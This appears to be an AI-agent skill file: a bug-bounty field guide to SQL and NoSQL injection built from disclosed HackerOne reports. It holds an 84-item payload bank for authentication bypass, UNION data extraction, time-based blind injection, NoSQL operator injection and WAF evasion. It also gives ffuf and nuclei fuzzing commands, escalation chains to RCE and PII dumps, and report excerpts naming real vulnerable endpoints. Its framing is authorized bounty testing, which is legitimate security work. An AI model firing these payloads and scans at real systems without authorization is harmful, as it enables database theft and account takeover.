---
name: hackerone-sqli
description: >-
  Hunt SQL and NoSQL injection. Use when testing search, filters, sorting, reporting, exports, and API query parameters. Backed by 331 disclosed HackerOne reports.
---

# SQL / NoSQL Injection — HackerOne field guide

Built from **331** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

## Signal

- Reports: **331** · paid: **84**
- Median bounty **$1,350** · p90 **$4,500** · max **$25,000** · total **$184,652**
- Median upvotes **18**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Mail.ru | 48 | $80,400 | 3005 |
| Valve | 2 | $25,000 | 451 |
| Razer | 12 | $20,000 | 2252 |
| Eternal | 11 | $15,600 | 888 |
| Uber | 8 | $13,500 | 342 |
| Internet Bug Bounty | 4 | $4,768 | 169 |
| GitHub Security Lab | 5 | $4,500 | 26 |
| Grab | 1 | $4,500 | 205 |

## Quick wins

Start here. These are the highest-yield tests for this class.

- Test every filter/sort/order parameter, including hidden ones from JS and mobile apps.
- Try boolean, time-based, and error-based payloads; note DB-specific syntax.
- Test JSON/GraphQL inputs and array/object params for operator injection.
- Check ORDER BY, LIMIT, column names, and table names where binding is missed.
- Look for second-order injection in stored fields rendered in reports/exports.

## Payloads & probes

- Boolean -> `' AND 1=1-- -` `' AND 1=2-- -`
- Time -> `'; SELECT pg_sleep(5)-- -` `' AND SLEEP(5)-- -` `'; WAITFOR DELAY '0:0:5'--`
- Union -> `' UNION SELECT NULL,version(),user()-- -`
- NoSQL -> `{"$ne":null}` `{"$gt":""}` `{"$regex":"^a"}`
- Header -> inject in User-Agent, Referer, X-Forwarded-For, Cookie

## Payload bank

**84 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Detection & authentication bypass

```text
'
"
')
';
\
' AND 1=1-- -
' AND 1=2-- -
' OR '1'='1
' OR 1=1-- -
" OR "1"="1
' OR '1'='1' --
' OR 1=1#
') OR ('1'='1
'||'1'='1
' AND 'x'='x
admin'--
admin'#
admin'/*
' OR 1=1 LIMIT 1-- -
```

### UNION / error-based

```text
' ORDER BY 1-- -
' ORDER BY 100-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
-1 UNION SELECT 1,2,3-- -
' UNION ALL SELECT NULL,version(),user()-- -
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT username,password FROM users-- -
' AND extractvalue(1,concat(0x7e,version()))-- -
' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
' AND 1=CAST((SELECT version()) AS int)-- -
' AND (SELECT * FROM (SELECT NAME_CONST(version(),1))a)-- -
' AND 1=(SELECT COUNT(*) FROM information_schema.tables)-- -
```

### Time-based blind

```text
' AND SLEEP(5)-- -
' OR SLEEP(5)-- -
'; SELECT SLEEP(5)-- -
' AND (SELECT 5 FROM (SELECT(SLEEP(5)))a)-- -
' AND BENCHMARK(5000000,MD5(1))-- -
'; WAITFOR DELAY '0:0:5'-- -
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -
'; SELECT pg_sleep(5)-- -
'||pg_sleep(5)-- -
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
1;SELECT PG_SLEEP(5)--
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))-- -
```

### NoSQL / operator injection

```text
{"$ne": null}
{"$gt": ""}
{"$regex": "^a"}
{"$where": "sleep(5000)"}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$or": [{"user": "admin"}, {"user": {"$ne": null}}]}
username[$ne]=x&password[$ne]=x
username[$regex]=^adm&password[$ne]=x
{"username": {"$in": ["admin", "root"]}, "password": {"$ne": "x"}}
{"password": {"$exists": true}}
```

### WAF & filter bypass

```text
'/**/AND/**/1=1-- -
'%09AND%091=1-- -
'%0aAND%0a1=1-- -
'/*!50000AND*/1=1-- -
' UnIoN SeLeCt 1,2,3-- -
' UNION/**/SELECT/**/1,2,3-- -
' UNION%0ASELECT%0A1,2,3-- -
'+UNION+SELECT+1,2,3--+-
'||(SELECT '1')||'
' AND 1=1 AND '1'='1
'/**/OR/**/'1'='1
' %0bOR %0b'1'='1
' AND 0x31=0x31-- -
' AND CHAR(49)=CHAR(49)-- -
' AND ASCII('A')=65-- -
' UNION SELECT 1,2,3 FROM dual-- -
' AND (SELECT 1)=(SELECT 1)-- -
```

### JSON, header & second-order points

```text
{"id": "1 OR 1=1"}
{"sort": "id; SELECT pg_sleep(5)"}
{"filter": {"$where": "this.a == this.a"}}
X-Forwarded-For: 127.0.0.1' OR 1=1-- -
User-Agent: ' OR SLEEP(5)-- -
Referer: ' AND 1=1-- -
Cookie: session=' OR 1=1-- -
id=1&id=2' OR '1'='1
id[]=1' OR '1'='1
id=1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_sqli.txt` (84)
- `~/.local/share/hackerone-reports/wordlists/payloads_sqli_waf.txt` (17 filter/WAF-focused)

## Bypass tricks

- Whitespace/comments: `/**/`, `%09`, `%0a`, inline comments between keywords.
- Case mixing and keyword splitting: `UN/**/ION`, `SEL/**/ECT`.
- WAF bypass with JSON/XML encoding, chunked bodies, and parameter pollution.
- Second-order: store payload, trigger in admin report/export.

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`id` `sort` `order` `order_by` `filter` `search` `q` `category` `limit` `offset` `date` `user`

## Tools

`sqlmap` · `Burp` · `ghauri` · `nuclei` · `interactsh`

## Escalation chains

- SQLi -> auth bypass.
- SQLi -> file read/write -> RCE.
- SQLi -> PII dump.

## Deeper checklist

- Test every filter/sort/order parameter, including hidden ones from JS and mobile apps.
- Try boolean, time-based, and error-based payloads; note DB-specific syntax.
- Test JSON/GraphQL inputs and array/object parameters for operator injection (`$ne`, `$gt`).
- Look at ORDER BY, LIMIT, and column names where parameter binding is often missed.
- Try second-order injection through stored fields rendered in reports/exports.
- Use OOB/ DNS callbacks for blind cases.
- Prove impact with data extraction, auth bypass, or write capability.

## Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database** — `#531051` · Starbucks · $0 · ▲801
  > It appeared to be some kind of accounting database entry as it expected nodes like `MainAccount`, `Credit`, `Debit`, `Invoice` and so on.
- **SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent** — `#297478` · GSA Bounty · $0 · ▲699
  > For example, setting the value `Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5 5),0))OR'` to the `User-Agent` header will cause the server to sleep for 25 (5 5) seconds.
- **SQL Injection in report_xml.php through countryFilter[] parameter** — `#383127` · Valve · $25,000 · ▲410
  > An unvalidated parameter on an partner reporting page (report xml.php) could be used to read certain SQL data from a single backing database.
- **[www.zomato.com] SQLi - /php/██████████ - item_id** — `#403616` · Eternal · $4,500 · ▲326
  > So I managed to find SQLi on `https://www.zomato.com/php/██████████` in the POST parameter item id.
- **SQL Injection on cookie parameter** — `#761304` · MTN Group · $0 · ▲323
  > Below requests has the lang parameter in cookies.
- **SQL Injection in agent-manager** — `#962889` · Acronis · $0 · ▲237
  > 2.https://mc-beta-cloud.acronis.com/api/agent manager/v2/unit configurations?name=update-schedule&no data=false&tenant id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+user%28%29%29%29%29and%27
- **Blind SQLi leading to RCE, from Unauthenticated access to a test API Webservice** — `#592400` · Starbucks · $0 · ▲236
  > @geek jeremy, at the same time as other hackers who submitted their own reports, discovered a browsable WSDL service on an API endpoint under the starbucks.com.cn domain, running on a non-standard port.
- **Blind SQL Injection on starbucks.com.gt and WAF Bypass  :*** — `#549355` · Starbucks · $0 · ▲210
  > Starting with a blind SQL Injection on http://www.starbucks.com.gt/menu/beverage/detail, @d3417 was able to dump schema on several database tables.
- **www.drivegrab.com SQL injection** — `#273946` · Grab · $4,500 · ▲205
  > curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm forms preview&after html=XXX[display-frm-data id=835 order by=id limit=1 order=zzz]YYY'
- **Blind SQL injection on id.indrive.com** — `#2051931` · inDrive · $4,134 · ▲199
  > A request to https://id.indrive.com/api/ten-drives/custom-winners/ten drive kz second weeks/number trips/29/5/phone will be made:
- **SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter** — `#435066` · HackerOne · $0 · ▲174
  > The `embedded submission form uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection.
- **Sql injection on docs.atavist.com** — `#1039315` · Automattic · $0 · ▲170
  > url:http://docs.atavist.com/reader api/stories.php?limit=10&offset=20&organization id=88822&search=0&sort=
- **bypass sql injection #1109311** — `#1224660` · Acronis · $0 · ▲164
  > Cookie: PHPSESSID=49kn3h0ecv1urjd70jucn2j4gh; fbp=fb.1.1623467463578.959472854; wordpress test cookie=WP+Cookie+check
- **SQLi | in URL paths** — `#2958619` · MTN Group · $0 · ▲149
  > We can use any SQL Commend here, by just closing the Statement ( putting `')` and then use a command and also we make sure to make the rest as a comment, here is a basic SQL command i used:
- **Solr Injection in `user_id` parameter at :/v2/leaderboard_v2.json** — `#952501` · Eternal · $2,000 · ▲137
  > Our team analyzed internally and found that only `fq={injection}` was possible on the `Solr` endpoint, hence the `Solr injection` was of low impact since there was no way to escalate it to exfiltrate data, one could have just changed the filter query but it…
- **SQL Injection vulnerability found on ibm.com endpoint** — `#3578842` · IBM · $0 · ▲137
  > The injection was verified via time-based payloads (e.g., SLEEP(5)), which caused a measurable delay in the server's response, proving that user-supplied input was being evaluated as part of an SQL query.
- **SQL Injection Union Based** — `#1046084` · Automattic · $0 · ▲137
  > Now you need to know your site id, to get then you need go to `https://intensedebate.com/user-dashboard` and you can see on the right side of the page your site list, choice your site and click to the link `Overview`.
- **[intensedebate.com] SQL Injection Time Based On /js/commentAction/** — `#1044698` · Automattic · $0 · ▲130
  > Bonus : the key`"src":0` is vulnerable to self-XSS, change the value by `"<iframe%20src=%23%20onload=alert('XSS') "` and you will see a XSS pop-up
- **SQL injection in structure plugin** — `#3249794` · ExpressionEngine · $0 · ▲125
  > Vulnerability: An SQL injection flaw was discovered in ExpressionEngine's Structure plugin, specifically in the delete channels() function.
- **SQL Injection at https://files.palantir.com/ due to CVE-2021-38159** — `#1525200` · Palantir Public · $0 · ▲121
  > https://blog.viettelcybersecurity.com/moveit-transfer-cve/
- **SQL injection on admin.acronis.host development web service** — `#923020` · Acronis · $250 · ▲118
  > The `-D` tells SQLMap which database and `--tables` tells SQLMap to drop table names.
- **SQL injection in URL path leads to Database Access** — `#2633959` · MTN Group · $0 · ▲115
  > https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562'/contactPersonId/0
- **SQL injection in  https://www.acronis.cz/ via the log parameter** — `#1109311` · Acronis · $0 · ▲103
  > I have discovered a SQL injection in https://www.acronis.cz/ using the POST request via the log parameter.
- **SQL Injection  intensedebate.com** — `#1069561` · Automattic · $0 · ▲102
  > Payload: acctid=1 AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)
- **Complete authentication bypass to admin permissions** — `#3564655` · Rocket.Chat · $0 · ▲100
  > By passing a MongoDB operator as the access token query parameter (e.g., ?access token[$ne]=null), an attacker can match the first OAuth token in the database without supplying valid credentials.
- **SQL Injection when using FilteredRelation** — `#3292573` · Django · $0 · ▲96
  > https://github.com/django/django/blob/main/tests/filtered relation/tests.py L124
- **Woocommerce SQL Injection in WC_Report_Coupon_Usage** — `#3198980` · Automattic · $0 · ▲96
  > Endpoint: /wp-admin/admin.php?page=wc-reports&tab=orders&report=coupon usage&coupon codes=')+union+select+1,sleep(10)--+-
- **Time based SQL injection at████████** — `#2312334` · U.S. Dept Of Defense · $0 · ▲96
  > While doing test on██████, I’ve found that the endpoint at /pubs/index.php is vulnerable with SQL injection vulnerability.
- **SQL Injection on sctrack.email.uber.com.cn** — `#150156` · Uber · $4,000 · ▲93
  > The username of mysql user is `sendcloud w@10.9.79.210`
- **Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-search.php Allowing Full Database Access in Revive Adserver v6.0.0** — `#3395221` · Revive Adserver · $0 · ▲93
  > Go to the following request: `http://localhost/www/admin/admin-search.php?keyword=FUZZ&compact=t`

## Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}` |
| 3× | `poc*/; SELECT '<INJECTION:DUMP_TRIGGER>'; /*` |
| 2× | `https://intensedebate.com/commenthistory/$YourSiteId` |
| 2× | `by Abusing LocalParams (` |
| 2× | `) in` |
| 2× | `. $table_name_layers .` |
| 2× | `securitylab@github.com` |
| 2× | `@@LANGID` |
| 2× | `__proto__` |
| 2× | `{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}` |
| 2× | `$regex` |
| 2× | `$limit` |
| 2× | `$order` |
| 2× | `$type` |
| 2× | `$where` |
| 2× | `$serendipity['fetchLimit']` |
| 2× | `MADB_DynStrGetWhere()` |
| 1× | `<MainAccount>123456</MainAccount>` |
| 1× | `<MainAccount>123456'</MainAccount>` |
| 1× | `<MainAccount>123456&apos;</MainAccount>` |

## Parameters observed

`hash` · `data` · `alert` · `content` · `_pageLabel` · `pwd` · `id` · `scn` · `Submit` · `page` · `searchText` · `username` · `check20` · `rcnum` · `acctid` · `jsontree` · `site_id` · `group_id` · `type` · `template`

## Case studies

### SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database
`#531051` · Starbucks · $0 · critical · 2019-08-06 · ▲801
> As described in the Hacker Summary, @spaceraccoon discovered a SQL Injection vulnerability in a web service backed by Microsoft Dynamics AX. @spaceraccoon demonstrated that the flaw was exploitable via XML-formatted HTTP payload requests to the server. We appreciate @spaceraccoon's clear and thorough report, which helped us quickly and effectively triage the report and remediate the vulnerability.

### SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent
`#297478` · GSA Bounty · $0 · critical · 2019-03-22 · ▲699
> I've identified an SQL injection vulnerability in the website labs.data.gov that affects the endpoint /dashboard/datagov/csv to json and can be exploited via the User-Agent HTTP header. I didn't extracted any data from the database, I've confirmed the vulnerability using sleep SQL queries with various arithmetic operations.

### SQL Injection in report_xml.php through countryFilter[] parameter
`#383127` · Valve · $25,000 · critical · 2018-07-27 · ▲410
> An unvalidated parameter on an partner reporting page (report xml.php) could be used to read certain SQL data from a single backing database. Blind SQL Injection && Akamai WAF Bypass. Wait for the write-up ;)

### [www.zomato.com] SQLi - /php/██████████ - item_id
`#403616` · Eternal · $4,500 · critical · 2018-09-11 · ▲326
> So I managed to find SQLi on https://www.zomato.com/php/██████████ in the POST parameter item id. Debugging and exploiting this issue was somewhat confusing in the beginning because there seems to be database caching going on based on the int value that is given. So for example when you submit item id=1111-stuffthatchangeshere multiple times the payload won't work anymore.

### SQL Injection on cookie parameter
`#761304` · MTN Group · $0 · high · 2020-05-03 · ▲323
> Hello team. It seams one of the parameters in the cookies is vulnerable to SQL injection. Below requests has the lang parameter in cookies. If you inject one quote mark like '. You get SQL error with the syntax. By injecting a second you have the error removed. I did not attempt to exfiltrate data as this is obvious indication of SQLi. I would like to ask for permission for further exploiting this issue.

## Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_sqli.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_sqli.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_sqli.txt` | 84 |
| `~/.local/share/hackerone-reports/wordlists/payloads_sqli_waf.txt` | 17 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_sqli.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_sqli.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_sqli.txt \
     -mr '<hit-marker>' -rate 20
```

## Nuclei

DAST SQLi templates fuzz parameters; confirm with manual boolean/time payloads before reporting.

```sh
nuclei -u https://target -tags sqli,time-based-sqli \
       -severity low,medium,high,critical -rl 40 -o nuclei_sqli.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/sqli -dast \
       -rl 40 -o nuclei_sqli_sqli.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_sqli_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class sqli --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class sqli
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class sqli
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class sqli --min-bounty 1000
```

## Related

- `hackerone-rce` (1,399 reports)
- `hackerone-info-disclosure` (1,827 reports)
- `hackerone-graphql` (79 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.
